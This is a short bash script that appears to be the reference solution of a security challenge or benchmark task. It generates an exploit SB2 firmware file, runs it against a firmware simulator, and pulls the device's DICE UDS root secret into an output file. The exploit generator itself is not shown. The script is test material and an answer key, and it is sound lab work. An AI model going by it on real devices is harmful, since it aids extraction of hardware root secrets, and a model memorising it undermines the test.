#!/bin/bash

# No extra pip dependencies needed -- uses only Python standard library.

# Step 1: Generate the exploit SB2 file
python3 /solution/exploit_gen.py
if [ $? -ne 0 ]; then
    echo "ERROR: exploit generation failed"
    exit 1
fi

# Step 2: Run the exploit against the firmware simulator
OUTPUT=$(/app/firmware_sim /app/exploit.sb2 2>&1)
RC=$?
echo "$OUTPUT"

if [ $RC -ne 0 ]; then
    echo "ERROR: firmware_sim rejected the update (exit code $RC)"
    exit 1
fi

# Step 3: Extract the DICE UDS from the simulator output
DICE_UDS=$(echo "$OUTPUT" | grep '^DICE_UDS:' | cut -d: -f2)

if [ -z "$DICE_UDS" ]; then
    echo "ERROR: could not find DICE_UDS in output"
    exit 1
fi

# Step 4: Write the extracted UDS to the output file
printf '%s' "$DICE_UDS" > /app/dice_uds.hex

echo ""
echo "=== Exploit successful ==="
echo "DICE UDS: $DICE_UDS"
echo "Written to /app/dice_uds.hex"
